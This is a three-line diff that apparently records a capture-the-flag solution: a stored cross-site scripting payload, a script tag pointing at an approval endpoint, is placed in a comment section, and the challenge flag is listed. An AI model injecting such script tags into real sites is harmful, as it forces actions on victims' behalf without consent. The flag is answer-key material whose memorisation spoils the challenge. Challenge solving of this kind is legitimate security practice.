@@ -1,0 +1,3 @@
+payload in comment section: <script src=/submission/96/approve></script>
+
+Flag: USCG{sp3c14l_5auc3_ftw}
